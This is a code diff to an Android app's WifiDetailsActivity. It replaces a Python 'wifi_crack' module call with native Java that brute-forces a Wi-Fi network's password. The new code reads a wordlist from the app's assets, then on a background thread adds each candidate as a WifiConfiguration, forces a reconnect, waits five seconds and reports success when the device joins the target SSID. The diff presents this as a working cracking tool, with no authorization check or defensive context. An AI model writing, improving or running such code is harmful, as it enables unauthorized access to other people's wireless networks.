@@ -1,18 +1,22 @@
 package com.example.mobilesentinel;
 
+import android.content.Context;
+import android.net.wifi.WifiConfiguration;
+import android.net.wifi.WifiManager;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.widget.Button;
 import android.widget.TextView;
-import android.content.Intent;
 import android.widget.ScrollView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
-import com.chaquo.python.PyObject;
-import com.chaquo.python.Python;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
 
 public class WifiDetailsActivity extends AppCompatActivity {
 
@@ -22,6 +26,8 @@ public class WifiDetailsActivity extends AppCompatActivity {
     private TextView terminalOutput;
     private Button startWifiCrackerButton;
     private ScrollView scrollView;
+    private WifiManager wifiManager;
+    private Handler handler;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -35,6 +41,12 @@ public class WifiDetailsActivity extends AppCompatActivity {
         terminalOutput = findViewById(R.id.terminalOutput);
         startWifiCrackerButton = findViewById(R.id.startWifiCrackerButton);
         scrollView = findViewById(R.id.scrollView);
+
+        // Initialize WifiManager
+        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+
+        // Initialize Handler for UI updates
+        handler = new Handler(Looper.getMainLooper());
 
         // Get WiFi data from Intent
         String wifiName = getIntent().getStringExtra("WIFI_NAME");
@@ -75,64 +87,76 @@ public class WifiDetailsActivity extends AppCompatActivity {
             return;
         }
 
-        Python py = Python.getInstance();
-        PyObject wifiCrackModule = py.getModule("wifi_crack");
-
-        String wordlistPath;
-        try {
-            // Open the wordlist file from assets
-            InputStream inputStream = getAssets().open("wordlist.txt");
-            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
-            StringBuilder content = new StringBuilder();
-            String line;
-
-            // Read the wordlist file line by line
-            while ((line = reader.readLine()) != null) {
-                content.append(line).append("\n");
-            }
-
-            reader.close();
-            wordlistPath = content.toString();
-        } catch (IOException e) {
-            // Handle the exception and notify the user
-            updateTerminalOutput("Error reading wordlist file: " + e.getMessage() + "\n");
+        // Read the wordlist from assets
+        List<String> wordlist = readWordlistFromAssets();
+        if (wordlist == null || wordlist.isEmpty()) {
+            updateTerminalOutput("Error: Wordlist is empty or could not be read.\n");
             return;
         }
 
         updateTerminalOutput("Starting WiFi cracking for network: " + wifiName + "\n");
 
-        // Run the cracking process
-        try {
-            PyObject result = wifiCrackModule.callAttr("crack_wifi_password", wifiName, wordlistPath);
-            if (result != null) {
-                String successMessage = "Success! Password for network '" + wifiName + "' is: " + result.toString() + "\n";
-                updateTerminalOutput(successMessage);
-            } else {
-                updateTerminalOutput("Failed to crack the password for network: " + wifiName + "\n");
+        // Start cracking process in a background thread
+        new Thread(() -> {
+            for (String password : wordlist) {
+                final String currentPassword = password;
+                handler.post(() -> updateTerminalOutput("Trying password: " + currentPassword + "\n"));
+
+                boolean isConnected = tryConnectToWifi(wifiName, currentPassword);
+                if (isConnected) {
+                    handler.post(() -> {
+                        updateTerminalOutput("Success! Connected to WiFi with password: " + currentPassword + "\n");
+                        Toast.makeText(WifiDetailsActivity.this, "Connected to WiFi!", Toast.LENGTH_SHORT).show();
+                    });
+                    return; // Stop if connected
+                }
             }
-        } catch (Exception e) {
-            updateTerminalOutput("Error during WiFi cracking: " + e.getMessage() + "\n");
-        }
+
+            handler.post(() -> updateTerminalOutput("Failed to crack the password for network: " + wifiName + "\n"));
+        }).start();
     }
 
-    private String getWordlistFromAssets() {
+    private List<String> readWordlistFromAssets() {
+        List<String> wordlist = new ArrayList<>();
         try {
             InputStream inputStream = getAssets().open("wordlist.txt");
             BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
-            StringBuilder content = new StringBuilder();
             String line;
 
             while ((line = reader.readLine()) != null) {
-                content.append(line).append("\n");
+                wordlist.add(line.trim());
             }
 
             reader.close();
-            return content.toString();
-        } catch (Exception e) {
+        } catch (IOException e) {
             updateTerminalOutput("Error reading wordlist: " + e.getMessage() + "\n");
             e.printStackTrace();
-            return null;
         }
+        return wordlist;
+    }
+
+    private boolean tryConnectToWifi(String ssid, String password) {
+        WifiConfiguration wifiConfig = new WifiConfiguration();
+        wifiConfig.SSID = String.format("\"%s\"", ssid);
+        wifiConfig.preSharedKey = String.format("\"%s\"", password);
+
+        int netId = wifiManager.addNetwork(wifiConfig);
+        if (netId == -1) {
+            return false; // Failed to add network
+        }
+
+        wifiManager.disconnect();
+        wifiManager.enableNetwork(netId, true);
+        wifiManager.reconnect();
+
+        // Simulate a delay to check connection status
+        try {
+            Thread.sleep(5000); // Wait for 5 seconds
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
+
+        return wifiManager.getConnectionInfo().getSSID().equals("\"" + ssid + "\"");
     }
 
     private void updateTerminalOutput(String message) {
